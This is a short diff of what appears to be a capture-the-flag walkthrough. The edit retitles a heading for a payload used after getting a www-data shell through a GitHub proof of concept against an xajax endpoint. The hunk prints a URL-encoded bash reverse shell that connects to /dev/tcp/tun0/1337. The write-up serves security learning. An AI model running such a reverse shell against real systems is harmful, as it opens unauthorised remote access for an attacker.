@@ -116,7 +116,7 @@ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&
 12. Noticed we a got a shell as `www-data`, which means in order to obtain the user flag, we need to swtich to a legitimate user account.
 13. Anyway I am not too comfortable using shell from the Github POC, let's do reverse shell on our own. Let's use bash.
 
-> PAYLOAD
+> BASH REVERSE SHELL - PAYLOAD
 
 ```txt
 bash -c 'bash -i >%26 /dev/tcp/tun0/1337 0>%261'
